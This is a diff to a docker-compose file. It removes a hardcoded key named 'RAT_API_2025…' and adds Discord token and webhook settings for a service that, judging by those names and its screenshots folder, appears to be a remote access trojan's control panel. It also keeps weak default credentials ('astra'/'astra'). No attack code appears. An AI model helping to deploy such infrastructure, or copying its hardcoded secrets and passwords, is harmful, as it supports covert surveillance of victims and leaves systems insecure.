@@ -8,17 +8,21 @@ services:
       - "5000:5000"
     environment:
       - FLASK_ENV=production
-      - API_KEY=${API_KEY:-RAT_API_2025_K7mP9sQ2xL5vB8nR3tA6cD}
-      - CENTRAL_SERVER_URL=http://web-panel:5000
-      - PANEL_USER=astra
-      - PANEL_PASS=astra
+      - PANEL_USER=${PANEL_USER:-astra}
+      - PANEL_PASS=${PANEL_PASS:-astra}
+      - DISCORD_TOKEN=${DISCORD_TOKEN:-}
+      - DISCORD_WEBHOOK=${DISCORD_WEBHOOK:-}
+      - DISCORD_CHANNEL=${DISCORD_CHANNEL:-0}
+      - PANEL_URL=${PANEL_URL:-http://localhost:5000}
+      - WEBHOOK_URL=${WEBHOOK_URL:-}
       - WATCHDOG_URL=${WATCHDOG_URL:-}
+      - SECRET_KEY=${SECRET_KEY:-}
     volumes:
       - ./logs:/app/logs
       - ./data:/app/data
       - ./screenshots:/app/screenshots
       - ./dist:/app/dist
-    restart: always
+    restart: unless-stopped
     healthcheck:
       test: ["CMD", "curl", "-f", "http://localhost:5000/api/ping"]
       interval: 30s
